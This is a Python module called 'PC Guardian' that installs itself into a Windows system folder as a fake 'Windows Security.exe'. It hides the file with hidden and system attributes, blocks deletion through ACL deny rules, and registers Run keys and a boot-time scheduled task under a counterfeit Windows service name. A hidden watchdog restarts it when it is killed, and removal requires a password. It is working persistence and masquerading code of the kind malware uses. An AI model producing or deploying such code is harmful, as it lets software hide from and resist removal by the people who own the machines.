"""
PC Guardian — Protection (FIXED)
- Installs exe into Windows system folder (System32 adjacent)
- Hides from normal view
- Delete requires password DECDRV
- Kill from Task Manager → auto restarts in 3 seconds
- Registers as fake Windows service name
"""

import os
import sys
import ctypes
import subprocess
import shutil
import threading
import time
import logging

logger = logging.getLogger("protection")

# ── INSTALL LOCATION ──────────────────────────────────────────────────────────
# Installs into C:\Windows\SystemApps\WindowsSecurity\ 
# Looks like a legit Windows component
INSTALL_DIR  = r"C:\Windows\SystemApps\WindowsSecurity"
EXE_NAME     = "Windows Security.exe"
INSTALL_PATH = os.path.join(INSTALL_DIR, EXE_NAME)

# Registry run key
REG_KEY   = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
REG_VALUE = "WindowsSecurityService"

# Task Scheduler name
TASK_NAME = "WindowsSecurityHealth"

DELETE_PASSWORD = "DECDRV"


def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def get_self_path() -> str:
    """Return path of running exe or script."""
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(__file__)


# ── INSTALL INTO SYSTEM FOLDER ────────────────────────────────────────────────

def install_to_system():
    """
    Copy exe into C:\Windows\SystemApps\WindowsSecurity\
    Set hidden + system attributes.
    """
    if not is_admin():
        logger.warning("Need admin to install to system folder.")
        return False

    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        src = get_self_path()

        # Only copy if not already running from install dir
        if os.path.abspath(src).lower() != INSTALL_PATH.lower():
            shutil.copy2(src, INSTALL_PATH)
            logger.info(f"Copied to {INSTALL_PATH}")

        # Set Hidden + System attributes
        ctypes.windll.kernel32.SetFileAttributesW(
            INSTALL_PATH,
            0x02 | 0x04  # FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
        )
        ctypes.windll.kernel32.SetFileAttributesW(
            INSTALL_DIR,
            0x02 | 0x04
        )

        # Protect with ACL — deny delete for Everyone
        subprocess.run(
            f'icacls "{INSTALL_PATH}" /deny Everyone:(D,M)',
            shell=True, capture_output=True
        )
        subprocess.run(
            f'icacls "{INSTALL_DIR}" /deny Everyone:(D,DC)',
            shell=True, capture_output=True
        )

        return True

    except Exception as e:
        logger.error(f"System install failed: {e}")
        return False


# ── STARTUP PERSISTENCE ───────────────────────────────────────────────────────

def install_registry():
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,  # HKLM — survives all users
            REG_KEY, 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, REG_VALUE, 0, winreg.REG_SZ, f'"{INSTALL_PATH}"')
        winreg.CloseKey(key)
        logger.info("Registry (HKLM) entry added.")
        return True
    except Exception as e:
        # Fallback to HKCU
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                REG_KEY, 0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, REG_VALUE, 0, winreg.REG_SZ, f'"{INSTALL_PATH}"')
            winreg.CloseKey(key)
            logger.info("Registry (HKCU) entry added.")
            return True
        except Exception as e2:
            logger.error(f"Registry failed: {e2}")
            return False


def install_task_scheduler():
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec>
      <Command>{INSTALL_PATH}</Command>
    </Exec>
  </Actions>
</Task>"""

    xml_path = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "wsh_task.xml")
    try:
        with open(xml_path, "w", encoding="utf-16") as f:
            f.write(xml)
        result = subprocess.run(
            f'schtasks /Create /TN "{TASK_NAME}" /XML "{xml_path}" /F',
            shell=True, capture_output=True, text=True
        )
        try: os.remove(xml_path)
        except Exception: pass
        if result.returncode == 0:
            logger.info("Task Scheduler entry created.")
            return True
    except Exception as e:
        logger.error(f"Task Scheduler: {e}")
    return False


# ── WATCHDOG — RESTART ON KILL ────────────────────────────────────────────────

class KillWatchdog:
    """
    Launches a separate lightweight watchdog process.
    If main process is killed, watchdog restarts it in 3 seconds.
    """

    WATCHDOG_SCRIPT = r"""
import sys, os, time, subprocess, psutil

target = sys.argv[1]
pid    = int(sys.argv[2])

while True:
    time.sleep(3)
    alive = False
    for p in psutil.process_iter(['pid','exe']):
        try:
            if p.info['pid'] == pid or (p.info['exe'] and os.path.abspath(p.info['exe']).lower() == os.path.abspath(target).lower()):
                alive = True
                break
        except Exception:
            pass
    if not alive:
        try:
            subprocess.Popen(
                [target],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except Exception:
            pass
        break
"""

    def start(self):
        try:
            import tempfile
            script_path = os.path.join(tempfile.gettempdir(), "wsh_wd.py")
            with open(script_path, "w") as f:
                f.write(self.WATCHDOG_SCRIPT)

            exe  = get_self_path()
            pid  = os.getpid()

            subprocess.Popen(
                [sys.executable, script_path, exe, str(pid)],
                creationflags=subprocess.CREATE_NO_WINDOW,
                close_fds=True
            )
            logger.info("Kill watchdog started.")
        except Exception as e:
            logger.error(f"Watchdog start failed: {e}")


# ── DELETE GUARD ──────────────────────────────────────────────────────────────

def check_delete_password(attempt: str) -> bool:
    return attempt.upper() == DELETE_PASSWORD.upper()


def remove_protection(password: str) -> tuple:
    """
    Full uninstall — only works with correct password.
    Returns (success, message)
    """
    if not check_delete_password(password):
        return False, "Wrong password. Cannot remove PC Guardian."

    errors = []

    # Remove ACL restrictions first
    try:
        subprocess.run(f'icacls "{INSTALL_PATH}" /remove Everyone', shell=True, capture_output=True)
        subprocess.run(f'icacls "{INSTALL_DIR}" /remove Everyone', shell=True, capture_output=True)
    except Exception: pass

    # Remove registry
    try:
        import winreg
        for hive in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
            try:
                key = winreg.OpenKey(hive, REG_KEY, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, REG_VALUE)
                winreg.CloseKey(key)
            except Exception: pass
    except Exception as e:
        errors.append(f"Registry: {e}")

    # Remove task scheduler
    try:
        subprocess.run(f'schtasks /Delete /TN "{TASK_NAME}" /F', shell=True, capture_output=True)
    except Exception as e:
        errors.append(f"Task: {e}")

    # Remove install dir
    try:
        shutil.rmtree(INSTALL_DIR, ignore_errors=True)
    except Exception as e:
        errors.append(f"Files: {e}")

    if errors:
        return True, f"Removed with minor errors: {'; '.join(errors)}"
    return True, "PC Guardian fully removed."


# ── FULL INSTALL ──────────────────────────────────────────────────────────────

def full_install():
    """Call this once on first run."""
    install_to_system()
    install_registry()
    install_task_scheduler()
    KillWatchdog().start()
    logger.info("Full protection installed.")
